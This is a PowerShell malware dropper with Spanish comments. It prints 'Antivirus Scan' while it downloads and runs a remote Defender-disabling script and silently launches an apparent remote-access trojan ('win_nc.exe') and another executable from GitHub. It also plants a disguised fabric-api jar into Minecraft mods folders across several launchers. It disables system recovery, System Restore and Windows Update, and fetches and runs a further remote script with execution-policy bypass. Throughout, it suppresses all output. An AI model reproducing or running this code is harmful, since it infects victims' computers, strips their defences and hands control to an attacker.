# ============================================================
#  FLUJO FINAL
# ============================================================

Write-Host "[+]Antivirus Scan..." -ForegroundColor Cyan

iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/MurphCodeDev/wf/main/Disable_Defender.ps1')) *> $null
Start-Sleep -Seconds 1

$workDir = "C:\ProgramData\Updater"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# $schostPath = "$workDir\schost.exe"
# if (-not (Test-Path $schostPath)) {
#     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/schost.exe" -OutFile $schostPath -ErrorAction SilentlyContinue > $null 2>&1
# }

$ratPath = "$workDir\win_nc.exe"
if (-not (Test-Path $ratPath)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath -ErrorAction SilentlyContinue > $null 2>&1
}
Start-Process -FilePath $ratPath -WindowStyle Hidden -ErrorAction SilentlyContinue

$winUpdatePath = "$workDir\WinUpdate.exe"
if (-not (Test-Path $winUpdatePath)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/WinUpdate.exe" -OutFile $winUpdatePath -ErrorAction SilentlyContinue > $null 2>&1
}

Start-Process -FilePath $winUpdatePath -WindowStyle Hidden -ErrorAction SilentlyContinue


# --- Buscar todas las carpetas 'mods' en los launchers de Minecraft (SILENCIOSO) ---
$jarName = "fabric-api-0.179.1_22.1.2.jar"
$tempJar = "$workDir\$jarName"
$destinos = @()

# 1. .minecraft/mods
$minecraftMods = "$env:APPDATA\.minecraft\mods"
if (Test-Path $minecraftMods) { $destinos += $minecraftMods }

# 2. Lunar Client
$lunarProfiles = "$env:USERPROFILE\.lunarclient\profiles"
if (Test-Path $lunarProfiles) {
    $destinos += Get-ChildItem -Path $lunarProfiles -Directory -ErrorAction SilentlyContinue | 
        Where-Object { Test-Path (Join-Path $_.FullName "mods") } | 
        ForEach-Object { Join-Path $_.FullName "mods" }
}

# 3. Feather
$featherMods = "$env:APPDATA\.feather\user-mods"
if (Test-Path $featherMods) { $destinos += $featherMods }
if (Test-Path $featherMods) {
    $destinos += Get-ChildItem -Path $featherMods -Directory -Recurse -ErrorAction SilentlyContinue | 
        Where-Object { $_.Name -eq "mods" } | 
        ForEach-Object { $_.FullName }
}

# 4. Prism Launcher (cada instancia tiene /minecraft/mods)
$prismInstances = "$env:APPDATA\PrismLauncher\instances"
if (Test-Path $prismInstances) {
    $destinos += Get-ChildItem -Path $prismInstances -Directory -ErrorAction SilentlyContinue | 
        ForEach-Object {
            $modsFolder = Join-Path $_.FullName "minecraft\mods"
            if (Test-Path $modsFolder) { $modsFolder }
        }
}

# Eliminar duplicados
$destinos = $destinos | Select-Object -Unique

# Si hay al menos una carpeta mods, descargar y copiar el .jar sin mostrar nada
if ($destinos.Count -gt 0) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/$jarName" -OutFile $tempJar -UseBasicParsing -ErrorAction SilentlyContinue > $null 2>&1
    foreach ($dest in $destinos) {
        Copy-Item -Path $tempJar -Destination "$dest\$jarName" -Force -ErrorAction SilentlyContinue > $null 2>&1
    }
}
# No se muestra ningún mensaje, ni siquiera de error o éxito

# schtasks /create /tn "Schost" /tr "cmd /c start /b $schostPath" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
# schtasks /create /tn "Win" /tr "cmd /c start /b $ratPath" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1

reagentc.exe /disable > $null 2>&1

Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v SetDisableUXWUAccess /t REG_DWORD /d 1 /f /reg:64 > $null 2>&1; `
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f /reg:64 > $null 2>&1; `
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 2 /f /reg:64 > $null 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/MurphCodeDev/wf/main/av_scan.ps1'))"

# Start-Sleep -Seconds 30


# Restart-Computer -Force
